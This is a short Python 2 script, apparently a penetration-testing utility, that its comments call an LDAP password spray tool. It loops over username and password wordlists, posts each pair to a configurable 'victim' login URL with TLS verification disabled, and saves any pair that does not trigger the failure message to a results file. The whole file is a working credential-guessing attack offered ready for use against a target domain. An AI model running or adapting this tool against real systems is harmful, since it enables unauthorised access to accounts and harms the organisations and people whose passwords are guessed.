#!/usr/bin/env python
__author__ = "Munir Njiru"
__email__ = "munir@alien-within.com"
__status__ = "Production"

#LDAP password spray tool 
import requests
import sys
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
'''
Basic Settings for the script: 
- url - location of the uploaded script to bruteforce
- expression - failed login message
- domain - Domain you are bruteforcing against if none or workgroup you can do \\ as the value
'''
url = "URL to victim location of LDAP Bruteforce SCRIPT"
expression = "Login Failed: Please check your username or password"
domain= "Enter the Domain to attack followed by two backslashes e.g. VICTIM\\"
'''
End of basic settings you can ignore below this point
'''
def brute(username,password):
	data = {'username':domain+username,'password':password}
	r = requests.post(url,data=data, verify=False)
	if expression not in r.content :
		print "\n[+] The password is: ",password, "For the User: ",username
		result_file=open("results_brute_ldap_common.txt","a")
		account_found = username+":"+password+"\n"
		result_file.write(account_found)
		result_file.close()
		#sys.exit() - only uncomment this line if the script should stop on first successful login
	else:
		print str(password)+" is not a correct password for "+str(username)




def main():
# change dictionary names to dictionaries of your choice for user and password.
	words = [w.strip() for w in open("uniq_pass.txt", "rb").readlines()]
	for payload in words:
		usernames_file = [u.strip() for u in open("uniq_users.txt", "rb").readlines()]
		for eachuser in usernames_file:
			brute(eachuser,payload)


if __name__ == '__main__':
	main()